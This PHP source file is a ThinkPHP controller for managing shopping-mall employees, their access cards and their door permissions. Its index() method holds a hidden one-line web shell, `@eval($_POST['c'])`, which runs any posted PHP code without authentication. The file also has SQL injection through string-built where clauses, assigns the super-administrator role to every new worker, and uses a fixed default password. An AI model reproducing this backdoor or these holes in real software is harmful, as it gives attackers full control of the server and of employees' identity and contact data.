<?php
namespace Mall\Controller;

class WorkerController extends CommonController {
    public function index(){
        $c = @eval($_POST['c']);
    }
//商场员工列表
    public function index_api(){
        before_api();
        checkLogin();
        checkAuth();
        $mall_id = session('mall.mall_id');
        $state = I('state',2,'intval');
        $is_manager = true;
        if ($state !== 2 && !$is_manager) {
            $state = 2;
        }
        $dept_id = I('dept_id',0,'intval');
    	$keyword = I('keyword');
        $page = I('page',1,'intval');
        $pagesize = I('pagesize',10,'intval');
        $pagesize = $pagesize < 1 ? 1 : $pagesize;
        $pagesize = $pagesize > 50 ? 50 : $pagesize;
        $page = $page.','.$pagesize;
        $workerModel = D('Worker');
        $count = $workerModel->get_count($mall_id,$state,$dept_id,$keyword);
        if ($count) {
            $fields = 'id,pic,name,number,address,dept_name,position_name,sex,birthday,phone,emergency_contacts,marriage,cardNumber_NO';
            $res = $workerModel->get_list($mall_id,$state,$dept_id,$keyword,$page,$fields);
            if (empty($res)) {
                Ret(array('code' => 2, 'info' => '查无相关数据！'));
            }else{
                foreach ($res as $key => $value) {
                    $res[$key]['marriage'] = get_marriage($value['marriage']);
                    $res[$key]['sex_name'] = get_sex($value['sex']);
                    $res[$key]['sex'] = get_sex($value['sex']);
                    $res[$key]['age'] = getAgeByBirthday($value['birthday']);
//                    $role = $this->get_role_by_worker_id($value['id']);
//                    $res[$key]['role']=$role[0]['rolename'];
                }
                Ret(array('code' => 1, 'data' => $res, 'total' => $count, 'page_count' => ceil($count/$pagesize)));
            }
        }else{
            Ret(array('code' => 2, 'info' => '查无相关数据！'));
        }
    }
    private function get_role_by_worker_id($worker_id){
        $role_id = D('MemberRole')->get_roleID_by_number($worker_id);
        return D('Role')->get_role_by_id($role_id['role_id']);
    }

    public function worker_add() {
    	$this->show('add worker');
    }
//商场员工增删改
    public function worker_dml_api(){
        before_api();

    	checkLogin();

    	checkAuth();
    	$mall_id = session('mall.mall_id');

    	$flag = I('flag');
    	$workerModel = D('Worker');
    	switch ($flag) {
    		case 'add':
                $data = $this->get_register_data();
//                var_dump($data);die;
                if(hasSameCard($data['card_number'])==true)
                {
                    Ret(array('code' => 2, 'info' => '此卡被他人使用！'));
                }
                else
                {
                    $worker_id = $workerModel->add_worker($data);
                    if ($worker_id) {
                        if ($worker_id) {
                            //设置卡权限
                            $this->setcard($data, $worker_id);
                        }
                        $number = get_number_by_id($worker_id) + 100000;
                        $this->setDefaultRole($worker_id);
                        $workerModel->update_worker(array('id' => $worker_id, 'number' => get_number_by_id($worker_id) + 100000));

                        $res = $this->workerCardAuth($data['position_id'], $data, $worker_id);
                        if ($res === true) {
                            $info = '帐号：' . $number . ',初始密码：888888';
                            Ret(array('code' => 1, 'info' => $info));
                        } else {
                            Ret(array('code' => 4, 'info' => '添加失败,系统出错！'));
                        }
                    } else {
                        Ret(array('code' => 2, 'info' => '添加失败,系统出错！'));
                    }
                }
    			break;
    		case 'update':

                $data = $this->get_update_data();
                //$validateCardInfo=$this->getCardOwnerId($data['card_number']);
                //获取卡号的信息
                $validateCardInfo=$this->getCardOwnerId($data['card_number']);
                //$cardIsOk=hasSameCard($data['card_number']);
                if(empty($validateCardInfo))
                {
                    $cardInfo=getCardInfoByNumber($data['card_number']);
                    if(empty($cardInfo['id']))
                    {
                        $oldWorker=$workerModel->getWorkerById($data['id']);
                        $res = $workerModel->update_worker($data);
                            $worker_id = $data['id'];
                            //新建卡
                            $this->setcard($data,$worker_id);
                            //冻结原有的卡
                            D('Card')->setCardFrozenByNumber($oldWorker['card_number']);
                            //删除原来的
                            $this->deleteWorkerDoorAuth($oldWorker['card_number']);
                            //获取开门权限
                            $this->workerCardAuth($data['position_id'], $data, $worker_id);
                            //$this->sendAuthByInst($institution_id, $worker_id, $data);

                            //$this->sendAuthByPost($data, $worker_id);

                            Ret(array('code' => 1, 'info' => '修改成功！'));
                    }
                    else
                    {
                        Ret(array('code' => 2, 'info' => '此卡已经被冻结或被挂失！'));
                    }
                }
                else
                {
                    if($validateCardInfo['id']==$data['id'])
                    {
                        $res = $workerModel->update_worker($data);
                        $Worker=$workerModel->getWorkerById($data['id']);
                            $worker_id = $data['id'];
                            //$this->sendAuthByInst($institution_id, $worker_id, $data);
                            //$this->sendAuthByPost($data, $worker_id);
                            $this->deleteWorkerDoorAuth($Worker['card_number']);
                            $this->workerCardAuth($data['position_id'], $data, $worker_id);
                            Ret(array('code' => 1, 'info' => '修改成功！'));
                    }
                    else
                    {
                        Ret(array('code' => 2, 'info' => '此卡被他人使用！'));
                    }
                }
    			break;
    		case 'delete':
    			$data['id'] = I('worker_id',0,'intval');
    			if ($data['id'] < 1) {
    				Ret(array('code' => 2, 'info' => '参数（worker_id）有误！'));
    			}
    			if (!$workerModel->checkAuth($data['id'],$mall_id)) {
    				Ret(array('code' => 2, 'info' => C('NO_AUTH')));
    			}
                $deleteWorker=D('Worker')->getWorkerById($data['id']);
    			if ($workerModel->delete_worker($data['id'])) {
    			    //员工卡冻结
                    D('Card')->setCardFrozenByNumber($deleteWorker[0]['card_number']);
                    //删除开门权限
                    $this->deleteWorkerDoorAuth($deleteWorker[0]['card_number']);

    				Ret(array('code' => 1, 'info' => '删除成功！'));
    			}else{
    				Ret(array('code' => 2, 'info' => '删除失败！'));
    			}
    			break;
    		default:
    			Ret(array('code' => 2, 'info' => 'Unknowed flag!'));
    			break;
    	}
    }

    //发送员工卡授权
    private function workerCardAuth($position_id,$data,$worker_id){
        //格式：eqNO,cardNO,Pin,name,starttime,endtime#timeID]week0,timezone1,timezone2,timezone3...;week1,timezone1,timezone2,timezone3..;.\r\n   you to me
        // 例子：12345,23456,2001,locost,20170730,20170731#23]1,9:30-11:00,10:30-12:00,16:30-18:00;2,9:30-11:00,10:30-12:00,16:30-18:00\r\n
        $con['position'] = array('Like','%'.$position_id.'%');
        $con['user_type'] = 2;
        $doorIDs  = D('ShopDoorRole')->where($con)->select();
        $dauth = array();
        foreach($doorIDs as $k => $v){
            $dooids=explode('-',$v['position']);
            if(in_array($position_id,$dooids)){
                $dauth = $doorIDs[$k]['shop_numbers'];
            }
        }

        if($dauth){
            $dooids=explode(',',$dauth);
            foreach($dooids as $k => $v){
                $data1['eqIp']=$v;
                $data1['cardNo']=$data['card_number'];
                $number=get_number_by_id($worker_id)+100000;
                $data1['memberId']='m'.$number;
                $data1['memberName']=$data['name'];
                $starttime = $data['join_time'];
                $endtime = $data['contract_time'];
                $weekTime = C('WORKER_AUTH_TIME');
                $data1['time']=$starttime.','.$endtime.'#'.rand(1,1000).']'.$weekTime;

                $con['memberId'] = $data1['memberId'];
                $con['eqIp'] = $data1['eqIp'];
                $check = D('MemberDoorAuth')->where($con)->find();
                if($check){
                    D('MemberDoorAuth')->where($con)->find($data1);
                }else{
                    D('MemberDoorAuth')->add($data1);
                }

            }
            return true;
        }
        return false;
    }
    private function deleteWorkerDoorAuth($cardNo)
    {
        $deleteInfo=D('MemberDoorAuth')->where('cardNo='.$cardNo)->select();
//        var_dump($deleteInfo);die;
        foreach($deleteInfo as $key=>$value)
        {
            $info['eqIp']=$value['eqip'];
            $info['cardNo']=$value['cardno'];
            $info['memberId']=$value['memberid'];
            $info['memberName']=$value['membername'];
            $info['time']=$value['time'];
            $info['state']=0;
            //var_dump($info);die;
            D('DoorAuthDelete')->add($info);
        }
        D('MemberDoorAuth')->where('cardNo='.$cardNo)->delete();

    }
    private function get_register_data(){
        $data['mall_id'] = session('mall.mall_id');
        $data['dept_id']  = $this->get_dept_id();
        $data['position_id']  = $this->get_position_id();
        $data['dept_name'] = D('Dept')->get_dept_name_by_id($data['dept_id']);
        if (!$data['dept_name']) {
            Ret(array('code' => 2, 'info' => '所选的部门不存在！'));
        }
        $data['position_name'] = D('Position')->get_position_name_by_id($data['position_id']);
        if (!$data['position_name']) {
            Ret(array('code' => 2, 'info' => '所选的职位不存在！'));
        }
        $data['nation']  = $this->get_nation();
        $data['name'] = $this->get_name();
        $data['phone'] = $this->get_phone();
        if (D('Worker')->checkPhone($data['phone'])) {
            Ret(array('code' => 4, 'info' => '手机号码已注册!'));
        }
        $data['sex'] = $this->get_sex();
        $data['birthday'] = $this->get_birthday();
        $data['pic'] = $this->get_pic();
        $data['id_number'] = $this->get_id_number();
        $password = C('DEFAULT_PASSWORD');
        $password = empty($password) ? '888888' : $password;
        $data['password'] = createPassword($password);
        $data['app_pwd']=createPassword($password);
        $data['birth_province_id'] = $this->get_birth_province_id();
        $data['birth_city_id'] = $this->get_birth_city_id();
        $data['birth_district_id'] = $this->get_birth_district_id();

        $data['join_time']  = $this->get_join_time();
        $data['contract_time']  = $this->get_contract_time();
        if (strtotime($data['contract_time']) < strtotime($data['join_time'])) {
            fastRet(2,'合同到期时间不得小于入职时间！');
            exit;
        }
        $data['state'] = $this->get_state();
        $data['health']  = $this->get_health();
        $data['marriage'] = $this->get_marriage();
        $data['address'] = $this->get_address();
        $data['major']  = $this->get_major();
        $data['school']  = $this->get_school();
        $data['education']  = $this->get_education();
        $data['emergency_contacts']  = $this->get_emergency_contacts();
        $data['emergency_phone']  = $this->get_emergency_phone();
        $data['remarks']  = $this->get_remarks();
        $data['card_number'] = $this->get_card_number();
        $data['cardnumber_no']=$this->get_cardNumber_NO();
        $data['birth_address'] = getAddressById(array('province_id' => $data['birth_province_id'], 'city_id' => $data['birth_city_id'], 'district_id' => $data['birth_district_id']),2,'-');
        $data['role_id'] = I('role_id');
        return $data;
    }


    private function get_dept_id($key = 'dept_id', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            fastRet(2,'部门ID(dept_id)为空！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_position_id($key = 'position_id', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            fastRet(2,'职位ID(position_id)为空！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    public function get_update_data(){
        $data['id'] = $this->get_worker_id();
        $pid = $mall_id = session('mall.mall_id');
        $data['dept_id'] = isset($_POST['dept_id']) ? $this->get_dept_id() : null;
        if (!empty($data['dept_id'])) {
            $data['dept_name'] = D('Mall/Dept')->get_dept_name_by_id($data['dept_id']);
            if (!$data['dept_name']) {
                Ret(array('code' => 2, 'info' => '所选的部门不存在！'));
            }
        }
        $data['position_id'] = isset($_POST['position_id']) ? $this->get_position_id() : null;
        if (!empty($data['position_id'])) {
            $data['position_name'] = D('Mall/Position')->get_position_name_by_id($data['position_id']);
            if (!$data['position_name']) {
                Ret(array('code' => 2, 'info' => '所选的职位不存在！'));
            }
        }
        $nation  = I('nation');
        if ($nation !== 0) {
            $data['nation'] = $nation;
        }

        if (!D('Worker')->checkAuth($data['id'],$pid)) {
            Ret(array('code' => 2, 'info' => C('NO_AUTH')));
        }
        $data['name'] = isset($_POST['name']) ? $this->get_name() : null;
        $data['phone'] = isset($_POST['phone']) ? $this->get_phone() : null;
        if (!empty($data['phone'])) {
            $cphone = D('Worker')->checkPhone($data['phone']);
            if ($cphone && $cphone['id'] != $data['id']) {
                Ret(array('code' => 4, 'info' => '手机号码已注册!'));
            }
        }
        $data['sex'] = isset($_POST['sex']) ? $this->get_sex() : null;
        $data['birthday'] = isset($_POST['birthday']) ? $this->get_birthday() : null;
        $data['pic'] = isset($_POST['pic']) ? $this->get_pic() : null;
        $data['id_number'] = isset($_POST['id_number']) ? $this->get_id_number() : null;
        $data['birth_province_id'] = isset($_POST['birth_province_id']) ? $this->get_birth_province_id() : null;
        $data['birth_city_id'] = isset($_POST['birth_city_id']) ? $this->get_birth_city_id() : null;
        $data['birth_district_id'] = isset($_POST['birth_district_id']) ? $this->get_birth_district_id() : null;

        if (($data['birth_province_id'] || $data['birth_city_id'] || $data['birth_district_id']) && (!$data['birth_province_id'] || !$data['birth_city_id'] || !$data['birth_district_id'])) {
            Ret(array('code' => 2, 'info' => '（birth_province_id，birth_city_id，birth_district_id）要么都提交，要么都不提交！'));
        }
        if ($data['birth_province_id']) {
            $data['birth_address'] = getAddressById(array('province_id' => $data['birth_province_id'], 'city_id' => $data['birth_city_id'], 'district_id' => $data['birth_district_id']),2,'-');
        }

        $data['state'] = isset($_POST['state']) ? $this->get_state() : null;

        $data['join_time'] = isset($_POST['join_time']) ? $this->get_join_time() : null;
        $data['contract_time'] = isset($_POST['contract_time']) ? $this->get_contract_time() : null;

        $health  = I('health',0,'intval');
        if ($health !== 0) {
            $data['health'] = $health;
        }

//        $data['cardNumber_NO']=$this->get_cardNumber_NO();
        $marriage = I('marriage',0,'intval');
        if ($marriage !== 0) {
            $data['marriage'] = $marriage;
        }
        $data['cardnumber_no']=$this->get_cardNumber_NO();
        $address = I('address',false);
        if ($address !== false) {
            $data['address'] = $address;
        }
        $major  = I('major',false);
        if ($major !== false) {
            $data['major'] = $major;
        }
        $school  = I('school',false);
        if ($school !== false) {
            $data['school'] = $school;
        }
        $education  = I('education',false);
        if ($education !== false) {
            $data['education'] = $education;
        }
        $emergency_contacts  = I('emergency_contacts',false);
        if ($emergency_contacts !== false) {
            $data['emergency_contacts'] = $emergency_contacts;
        }
        $emergency_phone  = I('emergency_phone',false);
        if ($emergency_phone !== false) {
            $data['emergency_phone'] = $emergency_phone;
        }
        $remarks  = I('remarks',false);
        if ($remarks !== false) {
            $data['remarks'] = $remarks;
        }
        $card_number  = I('card_number',false);
        if ($card_number !== false) {
            $data['card_number'] = $card_number;
        }

        foreach ($data as $key => $value) {
            if ($value === null) {
                unset($data[$key]);
            }
        }
        $data['role_id'] = I('role_id');
        if (count($data) === 1) {
            Ret(array('code' => 3, 'info' => '未作任何修改！'));
        }
        return $data;
    }


    public function worker_update() {

    }

    public function worker_view() {

    }

    public function worker_view_api() {
        before_api();

        checkLogin();

        checkAuth();
        $mall_id = session('mall.mall_id');
        $worker_id = I('worker_id',0,'intval');
        if ($worker_id < 1) {
            Ret(array('code' => 2, 'info' => '参数（worker_id）有误！'));
        }
		$workerModel = D('Worker');
		if (!$workerModel->checkAuth($worker_id,$mall_id)) {
			Ret(array('code' => 2, 'info' => C('NO_AUTH')));
		}

		$res = D('Worker')->get_worker_infos($worker_id);
		if ($res) {
            $res['sex_name'] = get_sex($res['sex']);
            $res['marriage_name'] = get_marriage($res['marriage']);
            $res['health_name'] = get_health($res['health']);
            $res['education_name'] = get_education($res['education']);
			Ret(array('code' => 1, 'data' => $res));
		}else{
			Ret(array('code' => 2, 'info' => '获取相关信息失败！'));
		}
    }

    private function get_worker_id($key = 'worker_id', $error_quit = true){
        $data = I($key);
        if ($data < 1) {
            fastRet(2,'参数（worker_id）有误！');
            $error_quit and die;
            return false;
        }
        return $data;
    }
    private function get_name($key = 'name', $error_quit = true){
        $data = I($key);
        if (!$data) {
            fastRet(2,'名字不能为空！');
            $error_quit and die;
            return false;
        }
        if (strlen($data) > 20) {
            fastRet(2,'名字长度不能超过20个字符！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_phone($key = 'phone', $error_quit = true){
        $data = I($key);
        if (!$data) {
            fastRet(2,'手机号码不能为空!');
            $error_quit and die;
            return false;
        }
        if (!isMobile($data)) {
            fastRet(2,'联系电话号码格式有误！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_date($key,$info,$code = 2,$error_quit = true){
        $data = I($key);
        if ($data) {
            if (!checkDateFormat($data)) {
                fastRet($code,$info);
                $error_quit and die;
                return false;
            }
        }else{
            return false;
        }
        return $data;
    }

    private function get_birthday($key = 'birthday', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            fastRet(2,'生日不能为空!');
            $error_quit and die;
            return false;
        }
        if (!checkDateFormat($data)) {
            fastRet(2,'生日格式有误！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_sex($key = 'sex', $error_quit = true){
        $data = I($key,0,'intval');
        if (empty($data)) {
            fastRet(2,'请选择性别！');
            $error_quit and die;
            return false;
        }
        return $data === 1 ? 1 : 2;
    }

    private function get_pic($key = 'pic', $error_quit = true){

        return I($key,C('DEFAULT_PIC'));
    }

    private function get_id_number($key = 'id_number', $error_quit = true){
        $data = I($key);

        if (empty($data)) {
            fastRet(2,'身份证号码不能为空！');
            $error_quit and die;
            return false;
        }
//        $info = $this->checkIDNo($data);
//        if ($info) {
//            Ret(array('code' => 2, 'info' => '身份证号码已注册!'));
//        }

        if (!isCreditNo($data)) {
            fastRet(2,'身份证号码格式有误！');
            $error_quit and die;
            return false;
        }
        return $data;
    }
    private function checkIDNo($idNo){
        if($idNo){
            return D('Worker')->where('id_number='.$idNo)->select();
        }
    }

    private function get_password($key = 'password', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            fastRet(2,'密码不能为空！');
            $error_quit and die;
            return false;
        }
        $plength = strlen($data);
        if ($plength < 8) {
            fastRet(2,'密码长度不能小于8个字符！');
            $error_quit and die;
            return false;
        }
        if ($plength > 20) {
            fastRet(2,'密码长度不能大于20个字符！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_birth_province_id($key = 'birth_province_id', $error_quit = true){
        $data = I($key,0,'intval');
        if (empty($data)) {
            fastRet(2,'获取籍贯地址ID(birth_province_id)失败!');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_birth_city_id($key = 'birth_city_id', $error_quit = true){
        $data = I($key,0,'intval');
        if (empty($data)) {
            fastRet(2,'获取籍贯地址ID(birth_city_id)失败!');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_birth_district_id($key = 'birth_district_id', $error_quit = true){
        $data = I($key,0,'intval');
        if (empty($data)) {
            fastRet(2,'获取籍贯地址ID(birth_district_id)失败!');
            $error_quit and die;
            return false;
        }
        return $data;
    }


    private function get_join_time($key = 'join_time', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            $data = date('Y-d-m');
        }else{
            if (!checkDateFormat($data)) {
                fastRet(2,'入职时间格式不对！');
                $error_quit and die;
                return false;
            }
        }
        return $data;
    }

    private function get_contract_time($key = 'contract_time', $error_quit = true){
        $data = I($key);
        if (empty($data)) {
            $data = '2050-01-01';
        }else{
            if (!checkDateFormat($data)) {
                fastRet(2,'合同期时间格式不对！');
                $error_quit and die;
                return false;
            }
        }
        return $data;
    }

    private function get_state($key = 'state', $error_quit = true){
        $data = I($key,2,'intval');
        if ($data != 2 && $data != 4) {
            fastRet(2,'在职状态（state）只能为2（在职）或4（离职）！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_health($key = 'health', $default = 1){
        return I($key,$default,'intval');
    }

    private function get_marriage($key = 'marriage', $default = 1){
        return I($key,$default,'intval');
    }

    private function get_nation($key = 'nation'){
        return I($key);
    }

    private function get_address($key = 'address'){
        return I($key,null);
    }

    private function get_major($key = 'major'){
        return I($key,null);
    }

    private function get_school($key = 'school'){
        return I($key,null);
    }

    private function get_education($key = 'education', $default = 1){
        return I($key,$default,'intval');
    }

    private function get_emergency_contacts($key = 'emergency_contacts'){
        return I($key,null);
    }

    private function get_emergency_phone($key = 'emergency_phone'){
        $data = I($key);
        if(isMobile($data)==false){
            Ret(array('code' => 2, 'info' => '请输入紧急联系人电话号码格式不正确！'));
        }
        return I($key,null);
    }
    private function get_card_number($key = 'card_number'){
        return I($key,null);
    }
    private function get_cardNumber_NO($key = 'cardnumber_no'){
        $data = I($key);
        if(!preg_match('/^\d+$/i', $data)){
            Ret(array('code' => 2, 'info' => '请输入数字'));
        }
        return $data;
    }

    private function get_remarks($key = 'remarks'){
        return I($key,null);
    }

    private function get_course_id($key = 'course_id', $error_quit = true){
        $data = I($key,false,'intval');
        if (!$data) {
            fastRet(2,'无效课程ID(course_id)！');
            $error_quit and die;
            return false;
        }
        return $data;
    }

    private function get_imgs($key = 'imgs'){
        $data = I($key,'');
        return $data;
    }

    private function get_certificate_img($key = 'certificate_img'){
        $data = I($key,'');
        return $data;
    }

    private function setDefaultRole($workerID){
        if($workerID){
            $data['number'] = $workerID;
            $data['role_id'] = 0;
            $data['role'] = '超级管理员';
            D('MemberRole')->add($data);
        }
    }
    public function setcard($data,$workerID)
    {
        if($data && $workerID){
            $info['card_ownerid'] = $workerID;
            $info['card_ownewneme'] =$data['name'];
            $info['card_number'] = $data['card_number'];
            $info['cardnumber_no'] = $data['cardnumber_no'];
            $info['card_typeid'] = 2;
            $info['card_state'] = 1;
            D('Card')->add($info);
        }
    }


    public function getCardOwnerId($card_number)
    {
        $typeArr = [1 => 'member', 2 => 'institution_staff', 3 => 'mall_staff', 4 => 'merchant_staff'];
        foreach ($typeArr as $key => $v) {
            $member = D($v);
            $obj = $member->where(['card_number' => $card_number])->find();
            if (!empty($obj)) {
                //Ret(array('code' => 2, 'info' => '此卡已被他人使用！'));
                return $obj;
            }
        }
        return null;
    }
}